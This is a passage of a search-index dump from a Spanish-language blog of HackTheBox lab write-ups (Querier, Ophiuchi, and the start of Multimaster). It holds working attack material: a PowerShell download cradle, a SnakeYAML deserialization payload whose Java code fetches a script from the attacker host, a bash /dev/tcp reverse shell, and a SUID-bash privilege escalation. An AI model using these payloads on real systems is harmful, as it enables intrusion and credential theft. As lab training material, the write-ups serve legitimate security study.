. y ejecutamos con Iex la instraccion para ejecutar e interpretar el script en la maquina victima y hacer un reconocimiento total: PS C:\Windows\system32&gt; Iex(New-Object Net. WebClient). downloadString('http://10. 10. 16. 4/PowerUp. ps1')Una vez ejecutado esperamos un poco y el sistema nos enumera unas credenciales Administrativas del archivo Groups. xml. PS C:\Windows\system32&gt; Iex(New-Object Net. WebClient). downloadString('http://10. 10. 16. 4/PowerUp. ps1')Privilege  : SeImpersonatePrivilegeAttributes : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLEDTokenHandle : 2468ProcessId  : 3744Name    : 3744Check    : Process Token PrivilegesServiceName  : UsoSvcPath     : C:\Windows\system32\svchost. exe -k netsvcs -pStartName   : LocalSystemAbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'CanRestart  : TrueName     : UsoSvcCheck     : Modifiable ServicesModifiablePath  : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsAppsIdentityReference : QUERIER\mssql-svcPermissions    : {WriteOwner, Delete, WriteAttributes, Synchronize. . . }%PATH%      : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsAppsName       : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsAppsCheck       : %PATH% . dll HijacksAbuseFunction   : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl. dll'UnattendPath : C:\Windows\Panther\Unattend. xmlName     : C:\Windows\Panther\Unattend. xmlCheck    : Unattended Install FilesChanged  : {2019-01-28 23:12:48}UserNames : {Administrator}NewName  : [BLANK]Passwords : {MyUnclesAreMarioAndLuigi!!1!}File   : C:\ProgramData\Microsoft\Group       Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups. xmlCheck   : Cached GPP FilesVamos a proceder a validar si las credenciales corresponden al usuario Administrador y efectivamente asi es: ❯ crackmapexec smb 10. 10. 10. 125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUPSMB     10. 10. 10. 125  445  QUERIER     [*] Windows 10. 0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)SMB     10. 10. 10. 125  445  QUERIER     [+] WORKGROUP\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)Ahora podemos hacer uso del puerto 5985 servicio de administracion remota de windows con la ayuda de evil-winrm nos dirigimos al directorio del usuario Administrator y podemos visualiar la segunda flag root. txt :). ❯ evil-winrm -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -i 10. 10. 10. 125Evil-WinRM shell v3. 4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github. com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd C:\Users\Administrator\Desktop*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root. txt6d6c9abc4b5ecfaf4587047710b1bbb3"
    }, {
    "id": 43,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Ophiuchi",
    "title": "Maquina Ophiuchi - htb writeup",
    "body": "2023/03/24 - Hoy vamos a hacer una máquina hackthebox de dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de deserialización de YAML para SnakeYAML utilizada en aplicaciones java, y modificando un archivo wasm para obtener privilegios de root. Vamos a comenzar creando un directorio con el nombre de la maquina: ❯ mkdir Ophiuchi❯ ls OphiuchiSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsEnumeración #: Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 227PING 10. 10. 10. 227 (10. 10. 10. 227) 56(84) bytes of data. 64 bytes from 10. 10. 10. 227: icmp_seq=1 ttl=63 time=124 ms--- 10. 10. 10. 227 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 124. 383/124. 383/124. 383/0. 000 msVemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre allPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 227 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-03-24 21:16 GMTInitiating SYN Stealth Scan at 21:16Scanning 10. 10. 10. 227 [65535 ports]Discovered open port 8080/tcp on 10. 10. 10. 227Discovered open port 22/tcp on 10. 10. 10. 227Completed SYN Stealth Scan at 21:17, 18. 29s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 227Host is up, received user-set (0. 15s latency). Scanned at 2023-03-24 21:16:59 GMT for 18sNot shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE  REASON22/tcp  open ssh    syn-ack ttl 638080/tcp open http-proxy syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 18. 46 seconds      Raw packets sent: 90294 (3. 973MB) | Rcvd: 90276 (3. 611MB)Podemos ver que los puertos que se encuentran abiertos son el puerto 22 ssh y el 8080 http. Escaneo de Version y Servicios. : ❯ nmap -sCV -p22,8080 10. 10. 10. 227 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-03-24 21:21 GMTNmap scan report for 10. 10. 10. 227Host is up (0. 27s latency). PORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)|  256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)|_ 256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)8080/tcp open http  Apache Tomcat 9. 0. 38|_http-title: Parse YAMLService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26. 57 secondsVisulizamos informacion interesante de los puertos escaneados:       Puerto   Servicio   Versión         22   SSH   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1       8080   HTTP   Apache Tomcat 9. 0. 38   Website - TCP 8080: Vamos a usar la herramienta whatweb para ver por consola el gestor de contenido de la pagina web. ❯ whatweb http://10. 10. 10. 227:8080http://10. 10. 10. 227:8080 [200 OK] Cookies[JSESSIONID], Country[RESERVED][ZZ], HttpOnly[JSESSIONID], IP[10. 10. 10. 227], Java, Title[Parse YAML]El comando nos reporta algo interesante Parse YAML Vamos a abrir la web y vemos que la pagina efectivamente es un Yaml Parser Vamos a realizar una busqueda para ver si hay un exploit o vulnerabilidad relacionado a Yaml Parser Encontramos un exploit publico en un repositorio de github:  https://github. com/artsploit/yaml-payload. El exploit nos habla sobre deserializacion, pero que es deserializacion?  Serializacion: Se refiere a un proceso por el cual se pasan un conjunto de bytes a un objeto entendible. En este repositorio nos habla de que mediante una deserealizacion insegura podemos conseguir RCE “ejecucion remota de comandos”: Basicamente se explota cuando una pagina tiene la funcion de parsear un archivo YAML.  ¿Pero como lo validamos entonces? Pues en el repositorio nos muestra un codigo en yaml que podemos parsear en la web donde al ejecutarse podemos aprovecharlo para ejecutar una peticion a nuestra maquina. Para lo cual primero debemos montarnos un servidor web, usaremos python: Despues realizamos el parseo: y vemos como efectivamente recibimos una peticion.  Explotación #: Al buscar el CVE encotramos un articulo sobre la vulnerabilidad:  CVE-2017-1000207 / Vuln in Swagger Parser and Swagger Codegen, YAML parsing results arbitrary code execution. Bueno entonces al pasarle nuestro payload SNAKE YAML llamara al constructor ScriptEngineFactory y este a su vez realizara una peticion a nuestra maquina. Vamos a descargar el repositorio que genera los payloads para poder ejecutar codigo en el sistema:  https://github. com/artsploit/yaml-payload. Hacemos la clonacion del repositorio: ❯ git clone https://github. com/artsploit/yaml-payloadClonando en 'yaml-payload'. . . remote: Enumerating objects: 10, done. remote: Total 10 (delta 0), reused 0 (delta 0), pack-reused 10Recibiendo objetos: 100% (10/10), listo. ❯ ls yaml-payload  2021-07-03-ophiuchi. mdEl exploit nos dice que debemos poner el codigo que deseamos ejecutar en AwesomeScriptEngineFactory. java ❯ tree. ├── 2021-07-03-ophiuchi. md└── yaml-payload  ├── README. md  └── src    ├── artsploit    │   └── AwesomeScriptEngineFactory. java    └── META-INF      └── services        └── javax. script. ScriptEngineFactory5 directories, 4 filesObservamos que se encuentra ahi el script AwesomeScriptEngineFactory. java lo abrimos y procedemos a modificar el codigo que queremos ejecutar package artsploit;import javax. script. ScriptEngine;import javax. script. ScriptEngineFactory;import java. io. IOException;import java. util. List;public class AwesomeScriptEngineFactory implements ScriptEngineFactory {  public AwesomeScriptEngineFactory() {    try {      Runtime. getRuntime(). exec( curl http://10. 10. 16. 4/reverse. sh -o /tmp/reverse. sh );      Runtime. getRuntime(). exec( bash /tmp/reverse. sh );    } catch (IOException e) {      e. printStackTrace();    }  }  @Override  public String getEngineName() {    return null;  }  @Override  public String getEngineVersion() {    return null;  }  @Override  public List&lt;String&gt; getExtensions() {    return null;  }  @Override  public List&lt;String&gt; getMimeTypes() {    return null;  }  @Override  public List&lt;String&gt; getNames() {    return null;  }  @Override  public String getLanguageName() {    return null;  }  @Override  public String getLanguageVersion() {    return null;  }  @Override  public Object getParameter(String key) {    return null;  }  @Override  public String getMethodCallSyntax(String obj, String m, String. . . args) {    return null;  }  @Override  public String getOutputStatement(String toDisplay) {    return null;  }  @Override  public String getProgram(String. . . statements) {    return null;  }  @Override  public ScriptEngine getScriptEngine() {    return null;  }}Como vemos en el script intentaremos al momento de realizar la desearializacion se ejecute una peticion que con curl nos realize una peticion a un archivo el cual alojaremos een nuestra maquina y lo depositaremos en el directorio tmp de la maquina victima con el nombre reverse. sh. Seguidamente procederemos a crear un script en bash con el nombre reverse. sh el cual al ejecutarse se encargara de ejecutarnos una peticion por el puerto 443 para obtener una shell reversa. #!/bin/bashbash -i &gt;&amp; /dev/tcp/10. 10. 16. 4/443 0&gt;&amp;1Procedemo a compilar AwesomeScriptEngineFactory. java y esto nos genera un archivo ❯ javac src/artsploit/AwesomeScriptEngineFactory. javajar -cvf yaml-payload. jar -C src/ . manifiesto agregadoignorando entrada META-INF/agregando: META-INF/services/(entrada = 0) (salida = 0)(almacenado 0%)agregando: META-INF/services/javax. script. ScriptEngineFactory(entrada = 36) (salida = 38)(desinflado -5%)agregando: artsploit/(entrada = 0) (salida = 0)(almacenado 0%)agregando: artsploit/AwesomeScriptEngineFactory. java(entrada = 1575) (salida = 420)(desinflado 73%)agregando: artsploit/AwesomeScriptEngineFactory. class(entrada = 1678) (salida = 705)(desinflado 57%)❯ ls src  README. md  yaml-payload. jarmodificamos el codigo YAML el cual insertaremos en la pagina YAML Parser, para que realize una peticion a nuestra maquina en donde tendremos alojado el archivo yaml-payload-jar y este a su vez nos ejecutara el codigo contenido que se encargara de realizar otra peticion a nuestro archivo reverse. sh !!javax. script. ScriptEngineManager [ !!java. net. URLClassLoader [[  !!java. net. URL [ http://10. 10. 16. 4/yaml-payload. jar ] ]]]Montamos un servidor con python en donde tenemos los dos archivos: ❯ ls src  README. md  reverse. sh  yaml-payload. jar❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . y nos ponemos en escucha con ncat en el puerto 443 ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Enviamos la peticion: y estamos dentro como el usuario tomcat: Como siempre vamos a realizar el tratamiento de la tty para obtener una full interactiva. ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 227. Ncat: Connection from 10. 10. 10. 227:56610. bash: cannot set terminal process group (796): Inappropriate ioctl for devicebash: no job control in this shelltomcat@ophiuchi:/$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/nulltomcat@ophiuchi:/$ ^Zzsh: suspended ncat -nlvp 443❯ stty raw -echo; fg[1] + continued ncat -nlvp 443                reset xtermtomcat@ophiuchi:/$ export TERM=xtermtomcat@ophiuchi:/$ export SHELL=bashtomcat@ophiuchi:/$ stty rows 48 columns 184 #dependera del tamaño de tu pantalla  ejecuta stty size Nos dirigimos al directorio home y tratamos de leer la primera flag user. txt pero vemos que no tenemos acceso: tomcat@ophiuchi:/$ cd /hometomcat@ophiuchi:/home$ lsadmintomcat@ophiuchi:/home$ cd admin/tomcat@ophiuchi:/home/admin$ lsuser. txttomcat@ophiuchi:/home/admin$ cat user. txt cat: user. txt: Permission deniedtomcat@ophiuchi:/home/admin$Como vemos que somos tomcat, si recordamos su estructura sabemos que existe un archivo llamado tomcat-users. xml tomcat@ophiuchi:/home/admin$ iduid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)tomcat@ophiuchi:/home/admin$ find / -name tomcat-users. xml 2&gt;/dev/null/opt/tomcat/conf/tomcat-users. xmltomcat@ophiuchi:/home/admin$Perfecto lo encontramos, ahora procedemos a leerlo y si efectivamente encontramos una credencial que corresponde al usuario admin &lt;tomcat-users xmlns= http://tomcat. apache. org/xml        xmlns:xsi= http://www. w3. org/2001/XMLSchema-instance        xsi:schemaLocation= http://tomcat. apache. org/xml tomcat-users. xsd 	version= 1. 0 &gt;&lt;user username= admin  password= whythereisalimit  roles= manager-gui,admin-gui /&gt;Procedemos esa contraseña con el usuario admin y bingo!, somos el usuario ‘admin’ y ahora si podemos visualizar la primera flag user. txt. tomcat@ophiuchi:/home/admin$ su adminPassword: admin@ophiuchi:~$ whoamiadminadmin@ophiuchi:~$ cat user. txt 330298484fe5a40840ac52e730fb7f15Ahora anteriormente vimos en la fase de reconocimiento que el puerto 22 estaba abierto, asi que por que no probemos a conectarnos por ssh: sshpass -p 'whythereisalimit' ssh admin@10. 10. 10. 227❯ ssh admin@10. 10. 10. 227The authenticity of host '10. 10. 10. 227 (10. 10. 10. 227)' can't be established. ECDSA key fingerprint is SHA256:OmZ+JsRqDVNaBWMshp7wogZM0KhSKkp1YmaILhRxSY0. Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10. 10. 10. 227' (ECDSA) to the list of known hosts. admin@10. 10. 10. 227's password: Welcome to Ubuntu 20. 04 LTS (GNU/Linux 5. 4. 0-51-generic x86_64)Ejecutamos el comando id para ver a que grupos pertenecemos y despues ejecutamos el comado sudo -l, para ver si podemos ejecutar un comando como usuario privilegiado ya que somos el usuario admin. Escalada de Privilegios #: admin@ophiuchi:~$ iduid=1000(admin) gid=1000(admin) groups=1000(admin)admin@ophiuchi:~$ sudo -lMatching Defaults entries for admin on ophiuchi:  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser admin may run the following commands on ophiuchi:  (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index. goadmin@ophiuchi:~$ Podemos ejecutar un programa llamado index. go usando el binario /usr/bin/go como root vale? Veremos como podemos aprovecharnos de esto para escalar privilegios. Nos dirigimos a la ruta donde se encuentra el archivo index. go. admin@ophiuchi:~$ cd /opt/wasm-functions/admin@ophiuchi:/opt/wasm-functions$ lsbackup deploy. sh index index. go main. wasmadmin@ophiuchi:/opt/wasm-functions$ ls -latotal 3928drwxr-xr-x 3 root root  4096 Oct 14 2020 . drwxr-xr-x 5 root root  4096 Oct 14 2020 . . drwxr-xr-x 2 root root  4096 Oct 14 2020 backup-rw-r--r-- 1 root root   88 Oct 14 2020 deploy. sh-rwxr-xr-x 1 root root 2516736 Oct 14 2020 index-rw-rw-r-- 1 root root   522 Oct 14 2020 index. go-rwxrwxr-x 1 root root 1479371 Oct 14 2020 main. wasmadmin@ophiuchi:/opt/wasm-functions$Veamos el codigo del archivo ìndex. go el cual podemos ejecutar: package mainimport (	 fmt 	wasm  github. com/wasmerio/wasmer-go/wasmer 	 os/exec 	 log )func main() {	bytes, _ := wasm. ReadBytes( main. wasm )	instance, _ := wasm. NewInstance(bytes)	defer instance. Close()	init := instance. Exports[ info ]	result,_ := init()	f := result. String()	if (f !=  1 ) {		fmt. Println( Not ready to deploy )	} else {		fmt. Println( Ready to deploy )		out, err := exec. Command( /bin/sh ,  deploy. sh ). Output()		if err != nil {			log. Fatal(err)		}		fmt. Println(string(out))	}}Al ejecutar el index. go vemos el mensaje Not ready to deploy el cual seria un problema por que al depender del directorio actual en el que este para ejecutarse, puedo secuestrar el archivo ‘main. wasm’ admin@ophiuchi:/opt/wasm-functions$ sudo /usr/bin/go run /opt/wasm-functions/index. goNot ready to deployadmin@ophiuchi:/opt/wasm-functions$Volvemos a leer el script y vemos que hay una variable f que es diferente de 1, y vemos que de ser lo contrario se daria la otra condicion que nos ejecutaria el deploy. sh, el cual podriamos tratar de manipular. package mainimport (	 fmt 	wasm  github. com/wasmerio/wasmer-go/wasmer 	 os/exec 	 log )func main() {	bytes, _ := wasm. ReadBytes( main. wasm )	instance, _ := wasm. NewInstance(bytes)	defer instance. Close()	init := instance. Exports[ info ]	result,_ := init()	f := result. String()	if (f !=  1 ) {		fmt. Println( Not ready to deploy )	} else {		fmt. Println( Ready to deploy )		out, err := exec. Command( /bin/sh ,  deploy. sh ). Output()		if err != nil {			log. Fatal(err)		}		fmt. Println(string(out))	}}Podemos ver si tenemos permiso de modificar el archivo deploy. sh admin@ophiuchi:/opt/wasm-functions$ cat deploy. sh #!/bin/bash# ToDo# Create script to automatic deploy our new web at tomcat port 8080admin@ophiuchi:/opt/wasm-functions$ ls -l deploy. sh -rw-r--r-- 1 root root 88 Oct 14 2020 deploy. shadmin@ophiuchi:/opt/wasm-functions$Despues de ver los permisos que tenemos sobre el archivo, sabemos que no podemos modificarlo pero vimos anteriormente que el script ìndex. go nos ejecuta el deploy. sh de forma relativa, interesante; entonces yo podria crearme en el directorio tmp mi propio archivo deploy. sh y copiarme el main. wasm ya que me los va a pillar desde alli y se podria tensa la cosa. admin@ophiuchi:/opt/wasm-functions$ cd /tmpadmin@ophiuchi:/tmp$ cp /opt/tomcat/     wasm-functions/ wasmer-go/   admin@ophiuchi:/tmp$ cp /opt/wasm-functions/main. wasm . admin@ophiuchi:/tmp$ touch deploy. shadmin@ophiuchi:/tmp$En deploy. sh lo que voy a intentar hacer es que este script me asigne una suid a la bash, para que como cualquier usuario en el sistema pueda spamear una consola como el propietario de forma temporal. #!/bin/bashchmod 4755 /bin/bashy si intentamos ejecutar nuevamente el index. go vemos que nuevamente nos sale. admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index. goNot ready to deployEntonces quiero pensar que en el archivo main. wasm del index. go debe existir una condicional que hace que la variable f no sea igual a 1 y por ese motivo no entra a la condicion que me ejecute el deploy. sh, pero si tratamos de leer el main. wasm no podriamos por que no es de un formato legible. La idea seria convertir el archivo main. wasm a un formato textual y hacer poder intentar alterar los valores, para ello podemos usar una herramienta disponible en github:  https://github. com/WebAssembly/wabtComo la maquina tiene python3 vamos a abrir un servidor web por el puerto 8000 para traernos el archivo main. wasm admin@ophiuchi:/tmp$ which python3/usr/bin/python3admin@ophiuchi:/tmp$ python3 -m http. server 8000Serving HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . 10. 10. 16. 4 - - [25/Mar/2023 01:21:42]  GET /main. wasm HTTP/1. 1  200 -wget http://10. 10. 10. 227:8000/main. wasm--2023-03-25 01:21:43-- http://10. 10. 10. 227:8000/main. wasmConectando con 10. 10. 10. 227:8000. . . conectado. Petición HTTP enviada, esperando respuesta. . . 200 OKLongitud: 1479371 (1,4M) [application/wasm]Grabando a: «main. wasm»main. wasm       100%[=========================&gt;]  1,41M  276KB/s  en 7,4s  2023-03-25 01:21:51 (195 KB/s) - «main. wasm» guardado [1479371/1479371]❯ ls yaml-payload  2021-07-03-ophiuchi. md  main. wasmAhora usando la herramienta previamente instalada haremos uso de wasm2wat sobre el archivo main. wasm y lo exportaremos como main. wat ❯ ls yaml-payload  2021-07-03-ophiuchi. md  main. wasm❯ cat main. wat(module (type (;0;) (func (result i32))) (func $info (type 0) (result i32)  i32. const 0) (table (;0;) 1 1 funcref) (memory (;0;) 16) (global (;0;) (mut i32) (i32. const 1048576)) (global (;1;) i32 (i32. const 1048576)) (global (;2;) i32 (i32. const 1048576)) (export  memory  (memory 0)) (export  info  (func $info)) (export  __data_end  (global 1)) (export  __heap_base  (global 2)))Al leer el archivo vemos que hay una constante declarada con el valor de 0 i32. const 0) la cual genera el problema por el cual el index. go no nos puede ejecutar el deploy. sh, asi que la modificaremos esa variable y le pondremos el valor de 1. (module (type (;0;) (func (result i32))) (func $info (type 0) (result i32)  i32. const 1) (table (;0;) 1 1 funcref) (memory (;0;) 16) (global (;0;) (mut i32) (i32. const 1048576)) (global (;1;) i32 (i32. const 1048576)) (global (;2;) i32 (i32. const 1048576)) (export  memory  (memory 0)) (export  info  (func $info)) (export  __data_end  (global 1)) (export  __heap_base  (global 2)))Una vez modificada debemos volver a generar un archivo main. wasm, el cual lo haremos con wat2wasm y lo subimos a la maquina victima compartiendonos un servicio con pythonno sin antes borrar el main. wasm de antes. ❯ /opt/wabt/build/wat2wasm main. wat &gt; main. wasm❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . admin@ophiuchi:/tmp$ rm main. wasm admin@ophiuchi:/tmp$ wget http://10. 10. 16. 4/main. wasm--2023-03-25 01:34:51-- http://10. 10. 16. 4/main. wasmConnecting to 10. 10. 16. 4:80. . . connected. HTTP request sent, awaiting response. . . 200 OKLength: 112 [application/wasm]Saving to: ‘main. wasm’main. wasm       100%[=========================&gt;]   112 --. -KB/s  in 0s2023-03-25 01:34:52 (23. 2 MB/s) - ‘main. wasm’ saved [112/112]admin@ophiuchi:/tmp$ lsdeploy. shhsperfdata_tomcatmain. wasmTeniendo los archivos volvemos a ejecutar el index. go con el privilegio asignado y admin@ophiuchi:/tmp$ sudo -lMatching Defaults entries for admin on ophiuchi:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser admin may run the following commands on ophiuchi:  (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index. goadmin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index. goReady to deployNos lo ejecuta correctamente, entonces nos ejecuto el deploy. sh veamos si es cierto: admin@ophiuchi:/tmp$ ls -ls /bin/bash1156 -rwsr-xr-x 1 root root 1183448 Feb 25 2020 /bin/bashy poom! ahora la bash es suid solo debemos ejecutar ahora el comando bash -p y visualizar la segunda flag root. txt y habriamos comprometido completamente el sistema :). admin@ophiuchi:/tmp$ bash -pbash-5. 0# whoamirootbash-5. 0# cd /rootbash-5. 0# cat root. txt 0a7279e90650d908863ec8e8155efb52bash-5. 0#"
    }, {
    "id": 44,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Multimaster",
    "title": "Maquina Multimaster - htb writeup",
    "body": "2023/03/24 - Hola de nuevo el de hoy vamos a estar resolviendo la maquina Multimaster de hackthebox que es una maquina Windows de dificultad Insane, la cosa se va a tensar :smirk:. Comenzaremos realizando la enumeracion por smb, despues usaremos wfuzz para enumerar caracteres por fuerza bruta para validar una inyeccion, posteriormente crearemos un script en python donde realizaremos una sql injection avanzada para hacer bypass un waf incorporado en la maquina, obtendremos los RID Y SID de los usuarios del dominio y con ellos encontraremos unas credenciales validas que nos permitiran conectarnos al sistema, donde aprovecharemos una vulnerabilidad asociada a una version de Visual Studio Code que por medio de la exposicion debugger lograremos obtener RCE, finalmente usaremos BoodHound donde setearemos kerberos dont require preauthetication a un usuario miembro del grupo Server Operators y manipulando el binPath nos convertiremos en el usuario Administrator. Vamos a comenzar como siempre creando un directorio con el nombre de la maquina: ❯ mkdir Multimaster❯ ls Multimaster❯ which mktmkt () {	mkdir {nmap,content,scripts}}❯ mkt❯ ls content  nmap  scriptsEnumeración #: Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 179PING 10. 10. 10. 179 (10. 10. 10. 179) 56(84) bytes of data. 64 bytes from 10. 10. 10. 179: icmp_seq=1 ttl=127 time=117 ms--- 10. 10. 10. 179 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 116. 535/116. 535/116. 535/0. 000 msVemos que recibimos respuesta y que el ttl es igual a 127 correspondiente a una maquina windowns, seguidamente procederemos a el scaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 179 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-03-31 15:32 GMTInitiating SYN Stealth Scan at 15:32Scanning 10. 10. 10. 179 [65535 ports]Discovered open port 135/tcp on 10. 10. 10. 179Discovered open port 53/tcp on 10. 10. 10. 179Discovered open port 445/tcp on 10. 10. 10. 179Discovered open port 3389/tcp on 10. 10. 10. 179Discovered open port 80/tcp on 10. 10. 10. 179Discovered open port 139/tcp on 10. 10. 10. 179Discovered open port 3269/tcp on 10. 10. 10. 179Discovered open port 389/tcp on 10. 10. 10. 179Discovered open port 9389/tcp on 10. 10. 10. 179Discovered open port 49698/tcp on 10. 10. 10. 179Discovered open port 49667/tcp on 10. 10. 10. 179Discovered open port 3268/tcp on 10. 10. 10. 179Discovered open port 49675/tcp on 10. 10. 10. 179Discovered open port 49674/tcp on 10. 10. 10. 179Discovered open port 49681/tcp on 10. 10. 10. 179Discovered open port 88/tcp on 10. 10. 10. 179Discovered open port 5985/tcp on 10. 10. 10. 179Discovered open port 593/tcp on 10. 10. 10. 179Discovered open port 49666/tcp on 10. 10. 10. 179Discovered open port 636/tcp on 10. 10. 10. 179Discovered open port 464/tcp on 10. 10. 10. 179Completed SYN Stealth Scan at 15:32, 41. 87s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 179Host is up, received user-set (0. 24s latency). Scanned at 2023-03-31 15:32:09 GMT for 41sNot shown: 65514 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE     REASON53/tcp  open domain      syn-ack ttl 12780/tcp  open http       syn-ack ttl 12788/tcp  open kerberos-sec   syn-ack ttl 127135/tcp  open msrpc      syn-ack ttl 127139/tcp  open netbios-ssn   syn-ack ttl 127389/tcp  open ldap       syn-ack ttl 127445/tcp  open microsoft-ds   syn-ack ttl 127464/tcp  open kpasswd5     syn-ack ttl 127593/tcp  open http-rpc-epmap  syn-ack ttl 127636/tcp  open ldapssl     syn-ack ttl 1273268/tcp open globalcatLDAP  syn-ack ttl 1273269/tcp open globalcatLDAPssl syn-ack ttl 1273389/tcp open ms-wbt-server  syn-ack ttl 1275985/tcp open wsman      syn-ack ttl 1279389/tcp open adws       syn-ack ttl 12749666/tcp open unknown     syn-ack ttl 12749667/tcp open unknown     syn-ack ttl 12749674/tcp open unknown     syn-ack ttl 12749675/tcp open unknown     syn-ack ttl 12749681/tcp open unknown     syn-ack ttl 12749698/tcp open unknown     syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 41. 95 seconds      Raw packets sent: 196589 (8. 650MB) | Rcvd: 47 (2. 068KB)Podemos ver puertos interesantes que se encuentran abiertos como 135 rpc , 139 ldap , 445 smb , 80 http, 88 Kerberos y 5985 winrm, podemos asumir que nos enfrentaremos a un entorno de directorio activo. Escaneo de Version y Servicios. : ❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49667,49674,49675,49681,49698 10. 10. 10. 179 -oN targetsStarting Nmap 7. 92 ( https://nmap. org ) at 2023-03-31 15:35 GMTNmap scan report for 10. 10. 10. 179Host is up (0. 24s latency). PORT   STATE SERVICE    VERSION53/tcp  open domain    Simple DNS Plus80/tcp  open http     Microsoft IIS httpd 10. 0|_http-server-header: Microsoft-IIS/10. 0|_http-title: MegaCorp| http-methods: |_ Potentially risky methods: TRACE88/tcp  open kerberos-sec Microsoft Windows Kerberos (server time: 2023-03-31 15:42:39Z)135/tcp  open msrpc     Microsoft Windows RPC139/tcp  open netbios-ssn  Microsoft Windows netbios-ssn389/tcp  open ldap     